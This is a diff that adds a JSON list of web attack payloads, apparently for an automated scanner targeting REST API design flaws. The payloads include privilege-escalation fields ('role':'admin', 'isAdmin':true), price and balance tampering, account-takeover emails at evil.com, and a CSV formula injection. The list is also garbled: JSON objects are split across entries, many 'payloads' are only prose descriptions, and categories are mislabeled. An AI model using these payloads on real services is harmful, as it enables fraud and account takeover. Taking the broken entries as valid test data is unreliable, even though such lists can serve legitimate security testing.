@@ -1,0 +1,453 @@
+[
+  {
+    "payload_id": "OWP-1059",
+    "vulnerability_category": "Insecure Design",
+    "target_technology": "REST API",
+    "injection_point": "body_json",
+    "payload_string": "{\"price\":0.01",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "success|admin"
+    }
+  },
+  {
+    "payload_id": "OWP-1060",
+    "vulnerability_category": "Insecure Design",
+    "target_technology": "REST API",
+    "injection_point": "body_json",
+    "payload_string": "\"quantity\":1000}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "success|admin"
+    }
+  },
+  {
+    "payload_id": "OWP-1061",
+    "vulnerability_category": "Insecure Design",
+    "target_technology": "REST API",
+    "injection_point": "body_json",
+    "payload_string": "{\"role\":\"admin\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "success|admin"
+    }
+  },
+  {
+    "payload_id": "OWP-1062",
+    "vulnerability_category": "Insecure Design",
+    "target_technology": "REST API",
+    "injection_point": "body_json",
+    "payload_string": "\"isAdmin\":true}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "success|admin"
+    }
+  },
+  {
+    "payload_id": "OWP-1063",
+    "vulnerability_category": "Insecure Design",
+    "target_technology": "REST API",
+    "injection_point": "body_json",
+    "payload_string": "{\"user_id\":1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "success|admin"
+    }
+  },
+  {
+    "payload_id": "OWP-1064",
+    "vulnerability_category": "Insecure Design",
+    "target_technology": "REST API",
+    "injection_point": "body_json",
+    "payload_string": "\"account\":\"new_account@evil.com\"}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "success|admin"
+    }
+  },
+  {
+    "payload_id": "OWP-1065",
+    "vulnerability_category": "Insecure Design",
+    "target_technology": "REST API",
+    "injection_point": "body_json",
+    "payload_string": "{\"email\":\"admin@target.com\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "success|admin"
+    }
+  },
+  {
+    "payload_id": "OWP-1066",
+    "vulnerability_category": "Insecure Design",
+    "target_technology": "REST API",
+    "injection_point": "body_json",
+    "payload_string": "\"newEmail\":\"attacker@evil.com\"}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "success|admin"
+    }
+  },
+  {
+    "payload_id": "OWP-1067",
+    "vulnerability_category": "Insecure Design",
+    "target_technology": "REST API",
+    "injection_point": "body_json",
+    "payload_string": "{\"product_id\":1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "success|admin"
+    }
+  },
+  {
+    "payload_id": "OWP-1068",
+    "vulnerability_category": "Insecure Design",
+    "target_technology": "REST API",
+    "injection_point": "body_json",
+    "payload_string": "\"quantity\":-1}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "success|admin"
+    }
+  },
+  {
+    "payload_id": "OWP-1069",
+    "vulnerability_category": "Insecure Design",
+    "target_technology": "REST API",
+    "injection_point": "body_json",
+    "payload_string": "{\"tier\":\"premium\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "success|admin"
+    }
+  },
+  {
+    "payload_id": "OWP-1070",
+    "vulnerability_category": "Insecure Design",
+    "target_technology": "REST API",
+    "injection_point": "body_json",
+    "payload_string": "\"upgrade\":true}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "success|admin"
+    }
+  },
+  {
+    "payload_id": "OWP-1071",
+    "vulnerability_category": "Insecure Design",
+    "target_technology": "REST API",
+    "injection_point": "body_json",
+    "payload_string": "{\"username\":\"admin\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "success|admin"
+    }
+  },
+  {
+    "payload_id": "OWP-1072",
+    "vulnerability_category": "Insecure Design",
+    "target_technology": "REST API",
+    "injection_point": "body_json",
+    "payload_string": "\"password\":\"newpass\"}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "success|admin"
+    }
+  },
+  {
+    "payload_id": "OWP-1073",
+    "vulnerability_category": "Insecure Design",
+    "target_technology": "REST API",
+    "injection_point": "body_json",
+    "payload_string": "{\"freeCredits\":10000",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "success|admin"
+    }
+  },
+  {
+    "payload_id": "OWP-1074",
+    "vulnerability_category": "Insecure Design",
+    "target_technology": "REST API",
+    "injection_point": "body_json",
+    "payload_string": "\"actualBalance\":0}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "success|admin"
+    }
+  },
+  {
+    "payload_id": "OWP-1075",
+    "vulnerability_category": "Insecure Design",
+    "target_technology": "REST API",
+    "injection_point": "body_json",
+    "payload_string": "{\"currency\":\"USD\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "success|admin"
+    }
+  },
+  {
+    "payload_id": "OWP-1076",
+    "vulnerability_category": "Insecure Design",
+    "target_technology": "REST API",
+    "injection_point": "body_json",
+    "payload_string": "\"amount\":999999}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "success|admin"
+    }
+  },
+  {
+    "payload_id": "OWP-1382",
+    "vulnerability_category": "Insecure Design",
+    "target_technology": "REST API",
+    "injection_point": "body_json",
+    "payload_string": "price=-1 in quantity=1 (negative price)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "success|admin"
+    }
+  },
+  {
+    "payload_id": "OWP-1383",
+    "vulnerability_category": "Insecure Design",
+    "target_technology": "REST API",
+    "injection_point": "body_json",
+    "payload_string": "orderTotal=0.01 in {\"actual\":100} (price tampering)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "success|admin"
+    }
+  },
+  {
+    "payload_id": "OWP-1384",
+    "vulnerability_category": "Insecure Design",
+    "target_technology": "REST API",
+    "injection_point": "body_json",
+    "payload_string": "coupon reuse race condition (same code multiple times)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "success|admin"
+    }
+  },
+  {
+    "payload_id": "OWP-1385",
+    "vulnerability_category": "Insecure Design",
+    "target_technology": "REST API",
+    "injection_point": "body_json",
+    "payload_string": "repeated failed login with no lockout",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "success|admin"
+    }
+  },
+  {
+    "payload_id": "OWP-1386",
+    "vulnerability_category": "Insecure Design",
+    "target_technology": "REST API",
+    "injection_point": "body_json",
+    "payload_string": "weak OTP: 000000 bypass",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "success|admin"
+    }
+  },
+  {
+    "payload_id": "OWP-1387",
+    "vulnerability_category": "Insecure Design",
+    "target_technology": "REST API",
+    "injection_point": "body_json",
+    "payload_string": "sequential order IDs predictable",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "success|admin"
+    }
+  },
+  {
+    "payload_id": "OWP-1388",
+    "vulnerability_category": "Insecure Design",
+    "target_technology": "REST API",
+    "injection_point": "body_json",
+    "payload_string": "batch API without auth check",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "success|admin"
+    }
+  },
+  {
+    "payload_id": "OWP-1389",
+    "vulnerability_category": "Insecure Design",
+    "target_technology": "REST API",
+    "injection_point": "body_json",
+    "payload_string": "no CSRF token on sensitive action",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "success|admin"
+    }
+  },
+  {
+    "payload_id": "OWP-1390",
+    "vulnerability_category": "Insecure Design",
+    "target_technology": "REST API",
+    "injection_point": "body_json",
+    "payload_string": "missing X-Frame-Options on password change",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "success|admin"
+    }
+  },
+  {
+    "payload_id": "OWP-1391",
+    "vulnerability_category": "Insecure Design",
+    "target_technology": "REST API",
+    "injection_point": "body_json",
+    "payload_string": "step skipping in multi-step flow (goto step 3 directly)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "success|admin"
+    }
+  },
+  {
+    "payload_id": "OWP-1392",
+    "vulnerability_category": "Insecure Design",
+    "target_technology": "REST API",
+    "injection_point": "body_json",
+    "payload_string": "password change without old password",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "success|admin"
+    }
+  },
+  {
+    "payload_id": "OWP-1393",
+    "vulnerability_category": "Insecure Design",
+    "target_technology": "REST API",
+    "injection_point": "body_json",
+    "payload_string": "LDAP injection in login form",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "success|admin"
+    }
+  },
+  {
+    "payload_id": "OWP-1394",
+    "vulnerability_category": "Insecure Design",
+    "target_technology": "REST API",
+    "injection_point": "body_json",
+    "payload_string": "username enumeration via timing attack",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "success|admin"
+    }
+  },
+  {
+    "payload_id": "OWP-1395",
+    "vulnerability_category": "Insecure Design",
+    "target_technology": "REST API",
+    "injection_point": "body_json",
+    "payload_string": "CSV injection in export: =CMD(\"calc\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "success|admin"
+    }
+  },
+  {
+    "payload_id": "OWP-1396",
+    "vulnerability_category": "Insecure Design",
+    "target_technology": "REST API",
+    "injection_point": "body_json",
+    "payload_string": "self-XSS by reflecting user input without encoding",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "success|admin"
+    }
+  },
+  {
+    "payload_id": "OWP-1397",
+    "vulnerability_category": "Insecure Design",
+    "target_technology": "REST API",
+    "injection_point": "body_json",
+    "payload_string": "response splitting via newline in name field",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "success|admin"
+    }
+  },
+  {
+    "payload_id": "OWP-1398",
+    "vulnerability_category": "Insecure Design",
+    "target_technology": "REST API",
+    "injection_point": "body_json",
+    "payload_string": "no rate limit on password reset",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "success|admin"
+    }
+  },
+  {
+    "payload_id": "OWP-1399",
+    "vulnerability_category": "Insecure Design",
+    "target_technology": "REST API",
+    "injection_point": "body_json",
+    "payload_string": "unlimited file size upload",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "success|admin"
+    }
+  },
+  {
+    "payload_id": "OWP-1400",
+    "vulnerability_category": "Insecure Design",
+    "target_technology": "REST API",
+    "injection_point": "body_json",
+    "payload_string": "bypass client-side validation only",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "success|admin"
+    }
+  },
+  {
+    "payload_id": "OWP-37401",
+    "vulnerability_category": "Insecure Design",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "\"username\": \"attacker\",",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37402",
+    "vulnerability_category": "Insecure Design",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "\"email\": \"attacker@email.com\",",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37403",
+    "vulnerability_category": "Insecure Design",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "\"password\": \"unsafe_password\",",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37404",
+    "vulnerability_category": "Insecure Design",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "\"isAdmin\": true",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  }
+]
